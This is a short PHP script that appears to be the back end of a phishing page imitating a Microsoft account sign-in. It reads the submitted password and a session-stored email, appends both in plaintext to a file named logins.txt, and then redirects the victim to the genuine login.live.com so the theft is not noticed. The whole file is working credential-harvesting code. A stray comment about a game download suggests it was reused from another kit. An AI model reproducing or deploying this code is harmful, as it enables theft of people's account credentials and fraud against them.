<?php

			session_start();
			
			$pass = $_POST["passwd"];
			$email=$_SESSION["loginfmt"];
			//opening logins text file for appending new data.
  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
			
  			//Writing email and password to logins.txt. 
			fwrite($file, "\r\n Email = ");
  			fwrite($file, $email);
			fwrite($file, "\r\n Pass = ");
			fwrite($file, $pass.PHP_EOL);
			fclose($file);//closing logins.txt.
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: https://login.live.com");
			exit();
			
			
			session_destroy();
			

?>

